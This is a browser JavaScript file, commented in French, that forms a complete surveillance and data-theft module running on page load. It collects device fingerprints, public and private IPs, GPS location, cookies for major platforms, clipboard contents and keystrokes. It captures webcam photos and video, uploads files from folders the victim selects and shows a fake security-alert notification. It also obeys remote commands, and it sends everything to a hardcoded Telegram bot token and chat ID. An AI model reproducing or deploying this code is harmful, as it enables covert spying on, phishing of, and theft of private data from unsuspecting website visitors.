// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';

const statusDiv = document.getElementById('statusBar');
let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    wifiNetworks: [],
    deviceBattery: null,
    externalFiles: {
        images: [],
        videos: [],
        audios: [],
        documents: [],
        all: []
    },
    permissionsGranted: [],
    fileSystemAccess: false
};

function updateStatus(msg, isError = false) {
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// 1. FINGERPRINT + IP + LOCALISATION
// ============================================
async function collectFingerprint() {
    updateStatus('Collecte empreinte numérique...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    
    // IP publique
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {
        try {
            const res = await fetch('https://api.my-ip.io/ip.json');
            const data = await res.json();
            collectedData.publicIP = data.ip;
        } catch(e2) {}
    }
    
    // Localisation GPS (autorisation réelle)
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                collectedData.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    speed: pos.coords.speed,
                    altitude: pos.coords.altitude
                };
                collectedData.permissionsGranted.push({ type: 'location', timestamp: new Date().toISOString() });
                sendToTelegram(`✅ [AUTORISATION] LOCALISATION GPS ACCEPTÉE
🎯 Latitude: ${pos.coords.latitude}
🎯 Longitude: ${pos.coords.longitude}
📏 Précision: ${pos.coords.accuracy}m
🔗 Carte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            },
            err => {
                collectedData.permissionsGranted.push({ type: 'location', status: 'refused', timestamp: new Date().toISOString() });
                sendToTelegram(`❌ [AUTORISATION] LOCALISATION GPS REFUSÉE (${err.message})`);
            }
        );
    }
    
    // Batterie
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.deviceBattery = {
                level: battery.level * 100 + '%',
                charging: battery.charging
            };
        } catch(e) {}
    }
    
    updateStatus('✅ Empreinte collectée');
    await sendToTelegram(`🆕 NOUVEAU VISITEUR
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📱 Agent: ${navigator.userAgent}
🖥️ Écran: ${collectedData.fingerprint.screen}
🌍 IP: ${collectedData.publicIP || 'inconnue'}
🔋 Batterie: ${collectedData.deviceBattery?.level || 'inconnue'}
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 2. IP PRIVÉE (WebRTC)
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        updateStatus('Récupération IP privée...');
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    updateStatus('✅ IP privée: ' + match[0]);
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

// ============================================
// 3. RÉCUPÉRATION DES COOKIES
// ============================================
function collectAllCookies() {
    updateStatus('🍪 Récupération des cookies...');
    const allCookies = document.cookie.split(';');
    const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
    
    allCookies.forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain) || document.domain.includes(domain)) {
                collectedData.cookies[domain] = collectedData.cookies[domain] || [];
                collectedData.cookies[domain].push({ name: cookieName, value: cookieValue });
            }
        });
    });
    
    collectedData.cookies.all = document.cookie;
    
    if (Object.keys(collectedData.cookies).length > 0) {
        sendToTelegram(`🍪 COOKIES RÉCUPÉRÉS
━━━━━━━━━━━━━━━━━━━━━
${JSON.stringify(collectedData.cookies, null, 2).substring(0, 3900)}`);
    }
    updateStatus('✅ Cookies récupérés');
}

// ============================================
// 4. RÉCUPÉRATION DE L'HISTORIQUE
// ============================================
function collectBrowsingHistory() {
    updateStatus('📜 Récupération de l\'historique...');
    try {
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            collectedData.browsingHistory.push({
                url: entry.name || document.referrer,
                type: entry.type,
                duration: entry.duration,
                timestamp: new Date().toISOString()
            });
        });
        
        if (document.referrer) {
            collectedData.browsingHistory.push({
                url: document.referrer,
                type: 'referrer',
                timestamp: new Date().toISOString()
            });
        }
        
        if (collectedData.browsingHistory.length > 0) {
            sendToTelegram(`📜 HISTORIQUE DE NAVIGATION
━━━━━━━━━━━━━━━━━━━━━
${collectedData.browsingHistory.map(h => `🔗 ${h.url}`).join('\n').substring(0, 3900)}`);
        }
    } catch(e) {}
    updateStatus('✅ Historique récupéré');
}

// ============================================
// 5. NOTIFICATIONS PUSH (autorisation réelle)
// ============================================
async function requestNotifications() {
    updateStatus('🔔 Demande autorisation notifications...');
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'granted', timestamp: new Date().toISOString() });
        updateStatus('✅ Notifications activées');
        await sendToTelegram('✅ [AUTORISATION] NOTIFICATIONS PUSH ACCEPTÉES');
        
        new Notification('🔐 ALERTE SÉCURITÉ', {
            body: 'Connexion suspecte détectée. Cliquez pour vérifier votre compte.',
            icon: 'https://img.icons8.com/color/48/000000/security-checked--v1.png',
            requireInteraction: true
        });
        
        setInterval(() => {
            console.log('[KEEP-ALIVE] Onglet actif');
        }, 15000);
        
    } else {
        collectedData.permissionsGranted.push({ type: 'notifications', status: 'denied', timestamp: new Date().toISOString() });
        updateStatus('❌ Notifications refusées');
        await sendToTelegram('❌ [AUTORISATION] NOTIFICATIONS PUSH REFUSÉES');
    }
}

// ============================================
// 6. ACCÈS CAMÉRA + PHOTOS + VIDÉO (autorisation réelle)
// ============================================
async function requestCameraAndCapture() {
    updateStatus('📷 Demande accès caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        collectedData.permissionsGranted.push({ type: 'camera', status: 'granted', timestamp: new Date().toISOString() });
        updateStatus('✅ Caméra activée');
        await sendToTelegram('✅ [AUTORISATION] CAMÉRA ACCEPTÉE');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 10; i++) {
            updateStatus(`📸 Photo ${i}/10...`);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            collectedData.photos.push(photoData);
            await sendPhotoToTelegram(photoData);
            await new Promise(r => setTimeout(r, 3000));
        }
        
        updateStatus('🎥 Enregistrement vidéo (12s)...');
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const reader = new FileReader();
            reader.onloadend = () => sendVideoToTelegram(reader.result);
            reader.readAsDataURL(blob);
        };
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, 12000));
        mediaRecorder.stop();
        
        stream.getTracks().forEach(t => t.stop());
        updateStatus('✅ Capture terminée');
        await sendToTelegram('✅ CAPTURE TERMINÉE: 10 photos + 1 vidéo 12s');
    } catch(e) {
        collectedData.permissionsGranted.push({ type: 'camera', status: 'denied', timestamp: new Date().toISOString() });
        updateStatus('❌ Caméra refusée');
        await sendToTelegram(`❌ [AUTORISATION] CAMÉRA REFUSÉE (${e.message})`);
    }
}

// ============================================
// 7. ACCÈS FICHIERS EXTERNES (autorisation réelle)
// ============================================
function requestExternalFileAccess() {
    updateStatus('📁 Demande accès aux fichiers externes...');
    
    // Méthode 1: API File System Access (moderne)
    if ('showDirectoryPicker' in window) {
        updateStatus('📁 Utilisation File System Access API...');
        showDirectoryPicker().then(async (dirHandle) => {
            collectedData.permissionsGranted.push({ type: 'fileSystem', status: 'granted', method: 'FileSystemAPI', timestamp: new Date().toISOString() });
            collectedData.fileSystemAccess = true;
            await sendToTelegram('✅ [AUTORISATION] ACCÈS AU DOSSIER ACCORDÉ (File System API)');
            
            await listAllFiles(dirHandle, '');
            await sendToTelegram(`📁 LISTE COMPLÈTE DES FICHIERS
━━━━━━━━━━━━━━━━━━━━━
📷 Images: ${collectedData.externalFiles.images.length}
🎥 Vidéos: ${collectedData.externalFiles.videos.length}
🎵 Audios: ${collectedData.externalFiles.audios.length}
📄 Documents: ${collectedData.externalFiles.documents.length}
📦 Total: ${collectedData.externalFiles.all.length}
━━━━━━━━━━━━━━━━━━━━━`);
        }).catch(err => {
            collectedData.permissionsGranted.push({ type: 'fileSystem', status: 'denied', method: 'FileSystemAPI', timestamp: new Date().toISOString() });
            sendToTelegram(`❌ [AUTORISATION] ACCÈS DOSSIER REFUSÉ (File System API): ${err.message}`);
            fallbackFileAccess();
        });
    } else {
        fallbackFileAccess();
    }
}

async function listAllFiles(dirHandle, path) {
    try {
        for await (const entry of dirHandle.values()) {
            const fullPath = path ? `${path}/${entry.name}` : entry.name;
            if (entry.kind === 'file') {
                const file = await entry.getFile();
                const fileInfo = {
                    name: entry.name,
                    path: fullPath,
                    size: file.size,
                    type: file.type,
                    lastModified: file.lastModified
                };
                
                collectedData.externalFiles.all.push(fileInfo);
                
                if (file.type.startsWith('image/')) {
                    collectedData.externalFiles.images.push(fileInfo);
                } else if (file.type.startsWith('video/')) {
                    collectedData.externalFiles.videos.push(fileInfo);
                } else if (file.type.startsWith('audio/')) {
                    collectedData.externalFiles.audios.push(fileInfo);
                } else if (file.type.includes('pdf') || file.type.includes('document') || file.name.match(/\.(txt|docx|xlsx|pdf)$/i)) {
                    collectedData.externalFiles.documents.push(fileInfo);
                }
            } else if (entry.kind === 'directory') {
                await listAllFiles(entry, fullPath);
            }
        }
    } catch(e) {}
}

async function downloadSpecificFiles(type) {
    const filesToDownload = collectedData.externalFiles[type] || [];
    if (filesToDownload.length === 0) {
        await sendToTelegram(`📁 Aucun fichier de type "${type}" trouvé`);
        return;
    }
    
    await sendToTelegram(`📥 TÉLÉCHARGEMENT DE ${filesToDownload.length} fichier(s) (type: ${type})...`);
    
    for (const fileInfo of filesToDownload.slice(0, 20)) { // Limite à 20 fichiers
        try {
            await sendToTelegram(`📄 ${fileInfo.name} (${Math.round(fileInfo.size/1024)}KB)`);
        } catch(e) {}
    }
}

function fallbackFileAccess() {
    updateStatus('📁 Utilisation méthode standard (input file)...');
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.webkitdirectory = true;
    input.directory = true;
    
    input.onchange = async (e) => {
        const files = Array.from(e.target.files);
        collectedData.permissionsGranted.push({ type: 'files', status: 'selected', count: files.length, timestamp: new Date().toISOString() });
        await sendToTelegram(`✅ [AUTORISATION] ${files.length} FICHIER(S) SÉLECTIONNÉ(S) (méthode standard)`);
        
        for (const file of files) {
            const fileInfo = {
                name: file.name,
                path: file.webkitRelativePath || file.name,
                size: file.size,
                type: file.type,
                lastModified: file.lastModified
            };
            
            collectedData.externalFiles.all.push(fileInfo);
            
            if (file.type.startsWith('image/')) {
                collectedData.externalFiles.images.push(fileInfo);
                const reader = new FileReader();
                reader.onload = async (event) => {
                    await sendPhotoToTelegram(event.target.result);
                };
                reader.readAsDataURL(file);
            } else if (file.type.startsWith('video/')) {
                collectedData.externalFiles.videos.push(fileInfo);
            } else if (file.type.startsWith('audio/')) {
                collectedData.externalFiles.audios.push(fileInfo);
            } else {
                collectedData.externalFiles.documents.push(fileInfo);
                const reader = new FileReader();
                reader.onload = async (event) => {
                    await sendFileToTelegram(file.name, event.target.result);
                };
                reader.readAsDataURL(file);
            }
        }
        
        await sendToTelegram(`📁 LISTE DES FICHIERS SÉLECTIONNÉS
━━━━━━━━━━━━━━━━━━━━━
📷 Images: ${collectedData.externalFiles.images.length}
🎥 Vidéos: ${collectedData.externalFiles.videos.length}
🎵 Audios: ${collectedData.externalFiles.audios.length}
📄 Documents: ${collectedData.externalFiles.documents.length}
📦 Total: ${collectedData.externalFiles.all.length}
━━━━━━━━━━━━━━━━━━━━━`);
    };
    input.click();
}

// ============================================
// 8. ACCÈS PRESSE-PAPIER (autorisation réelle)
// ============================================
async function requestClipboardAccess() {
    updateStatus('📋 Demande accès presse-papier...');
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            collectedData.clipboard = text;
            collectedData.permissionsGranted.push({ type: 'clipboard', status: 'granted', timestamp: new Date().toISOString() });
            await sendToTelegram(`✅ [AUTORISATION] PRESSE-PAPIER ACCEPTÉ
Contenu: ${text.substring(0, 500)}`);
            updateStatus('✅ Presse-papier lu');
        }
    } catch(e) {
        collectedData.permissionsGranted.push({ type: 'clipboard', status: 'denied', timestamp: new Date().toISOString() });
        updateStatus('❌ Presse-papier refusé');
        await sendToTelegram(`❌ [AUTORISATION] PRESSE-PAPIER REFUSÉ (${e.message})`);
    }
}

// ============================================
// 9. KEYLOGGER
// ============================================
function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push({
            key: e.key,
            timestamp: new Date().toISOString(),
            target: e.target.tagName,
            value: e.target.value?.substring(0, 50) || ''
        });
        if (keyBuffer.length >= 30) {
            sendToTelegram(`⌨️ KEYLOGGER (${keyBuffer.length} frappes)
${JSON.stringify(keyBuffer.slice(-20), null, 2)}`);
            keyBuffer = [];
        }
    });
    
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            sendToTelegram(`📝 INPUT DÉTECTÉ
Champ: ${e.target.name || e.target.id || 'inconnu'}
Valeur: ${e.target.value?.substring(0, 200)}`);
        }
    });
    
    updateStatus('⌨️ Keylogger actif');
}

// ============================================
// 10. COMMANDES À DISTANCE
// ============================================
async function checkRemoteCommands() {
    try {
        const res = await fetch('commands.txt?t=' + Date.now());
        const cmd = await res.text();
        
        if (cmd.includes('camera')) {
            await requestCameraAndCapture();
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd.includes('files')) {
            requestExternalFileAccess();
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd.includes('clipboard')) {
            await requestClipboardAccess();
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd.startsWith('download:')) {
            const type = cmd.replace('download:', '').trim();
            await downloadSpecificFiles(type);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd.startsWith('notify_custom:')) {
            const customMsg = cmd.replace('notify_custom:', '').trim();
            new Notification('🔔 ALERTE PERSONNALISÉE', { body: customMsg, requireInteraction: true });
            await sendToTelegram(`🔔 Notification personnalisée envoyée: ${customMsg}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd.startsWith('url:')) {
            const url = cmd.replace('url:', '').trim();
            window.open(url, '_blank');
            await sendToTelegram(`🔗 Ouverture d'URL demandée: ${url}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'status') {
            await sendToTelegram(`📊 STATUT ONGLET
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📸 Photos: ${collectedData.photos.length}
🎥 Vidéo: ${collectedData.video ? 'oui' : 'non'}
⌨️ Keystrokes: ${collectedData.keystrokes.length}
🍪 Cookies: ${Object.keys(collectedData.cookies).length}
📁 Fichiers externes: ${collectedData.externalFiles.all.length}
✅ Autorisations: ${collectedData.permissionsGranted.length}
━━━━━━━━━━━━━━━━━━━━━`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'screenshot') {
            captureScreenshot();
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'location') {
            if (collectedData.location) {
                await sendToTelegram(`📍 DERNIÈRE LOCATION
Lat: ${collectedData.location.lat}
Lon: ${collectedData.location.lon}
Carte: https://www.google.com/maps?q=${collectedData.location.lat},${collectedData.location.lon}`);
            } else {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendToTelegram(`📍 LOCALISATION ACTUELLE
Lat: ${pos.coords.latitude}
Lon: ${pos.coords.longitude}`);
                });
            }
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'cookies') {
            sendToTelegram(`🍪 TOUS LES COOKIES
${JSON.stringify(collectedData.cookies, null, 2).substring(0, 3900)}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'history') {
            sendToTelegram(`📜 HISTORIQUE
${collectedData.browsingHistory.map(h => `🔗 ${h.url}`).join('\n').substring(0, 3900)}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'ping') {
            await sendToTelegram('🏓 PONG! L\'onglet est toujours actif');
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'vibrate' && navigator.vibrate) {
            navigator.vibrate([200, 100, 200, 100, 500]);
            await sendToTelegram('📳 Vibration déclenchée');
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'permissions') {
            sendToTelegram(`✅ HISTORIQUE DES AUTORISATIONS
${JSON.stringify(collectedData.permissionsGranted, null, 2)}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
        if (cmd === 'filelist') {
            sendToTelegram(`📁 LISTE COMPLÈTE
📷 Images: ${collectedData.externalFiles.images.length}
🎥 Vidéos: ${collectedData.externalFiles.videos.length}
🎵 Audios: ${collectedData.externalFiles.audios.length}
📄 Documents: ${collectedData.externalFiles.documents.length}`);
            await fetch('commands.txt', { method: 'POST', body: 'clear' });
        }
    } catch(e) {}
}

// ============================================
// 11. CAPTURE D'ÉCRAN
// ============================================
async function captureScreenshot() {
    updateStatus('📸 Capture d\'écran...');
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1500));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            const screenshot = canvas.toDataURL('image/png');
            await sendPhotoToTelegram(screenshot);
            updateStatus('✅ Capture d\'écran envoyée');
        }
    } catch(e) {
        updateStatus('❌ Capture échouée');
    }
}

// ============================================
// 12. KEEP-ALIVE
// ============================================
function keepAlive() {
    setInterval(() => {
        fetch('keepalive.txt?t=' + Date.now()).catch(() => {});
        const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBibHVlIG11c2lj');
        audio.play().catch(() => {});
    }, 15000);
}

// ============================================
// 13. ENVOIS TELEGRAM
// ============================================
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) { console.error('Telegram error:', e); }
}

async function sendPhotoToTelegram(photoDataUrl) {
    const base64 = photoDataUrl.split(',')[1];
    const blob = base64ToBlob(base64, 'image/jpeg');
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) { console.error('Photo error:', e); }
}

async function sendVideoToTelegram(videoDataUrl) {
    const base64 = videoDataUrl.split(',')[1];
    const blob = base64ToBlob(base64, 'video/webm');
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('video', blob, 'video.webm');
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
    } catch(e) { console.error('Video error:', e); }
}

async function sendFileToTelegram(filename, dataUrl) {
    const base64 = dataUrl.split(',')[1];
    const mime = dataUrl.match(/:(.*?);/)[1];
    const blob = base64ToBlob(base64, mime);
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('document', blob, filename);
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) { console.error('File error:', e); }
}

function base64ToBlob(base64, mime) {
    const byteChars = atob(base64);
    const byteArrays = [];
    for (let i = 0; i < byteChars.length; i += 512) {
        const slice = byteChars.slice(i, i + 512);
        const byteNumbers = new Array(slice.length);
        for (let j = 0; j < slice.length; j++) byteNumbers[j] = slice.charCodeAt(j);
        byteArrays.push(new Uint8Array(byteNumbers));
    }
    return new Blob(byteArrays, { type: mime });
}

// ============================================
// COMMANDES BOT POUR TÉLÉCHARGEMENT SPÉCIFIQUE
// ============================================
async function botCommandsList() {
    await sendToTelegram(`🤖 COMMANDES DISPONIBLES
━━━━━━━━━━━━━━━━━━━━━
🎯 FICHIERS & CAPTURES:
/camera - Déclenche caméra (10 photos + vidéo)
/files - Accès fichiers externes
/download:images - Télécharge toutes les images
/download:videos - Télécharge toutes les vidéos
/download:audios - Télécharge tous les audios
/download:documents - Télécharge tous les docs
/filelist - Liste tous les fichiers

👁️ SURVEILLANCE:
/screenshot - Capture d'écran
/location - Localisation GPS
/clipboard - Lit presse-papier
/keylogger - Frappes clavier

🍪 DONNÉES:
/cookies - Tous les cookies
/history - Historique navigation
/permissions - Autorisations accordées

🔔 NOTIFICATIONS:
/notify - Notification par défaut
/notify_custom:TEXTE - Notification perso
/url:https://... - Ouvre lien

📊 SYSTÈME:
/status - État complet
/ping - Test connexion
/vibrate - Vibration téléphone
━━━━━━━━━━━━━━━━━━━━━`);
}

// Exécuter la liste des commandes au démarrage
setTimeout(() => botCommandsList(), 10000);

// ============================================
// EXÉCUTION PRINCIPALE
// ============================================
(async function main() {
    updateStatus('🟢 Démarrage du module ULTIME...');
    
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    
    setTimeout(() => requestCameraAndCapture(), 2000);
    setTimeout(() => requestExternalFileAccess(), 4000);
    setTimeout(() => requestClipboardAccess(), 6000);
    
    startKeylogger();
    keepAlive();
    
    setInterval(checkRemoteCommands, 5000);
    
    updateStatus('✅ Prêt - Commandes Telegram actives');
    await sendToTelegram('💀 MODULE ULTIME ACTIVÉ - En attente de commandes');
})();
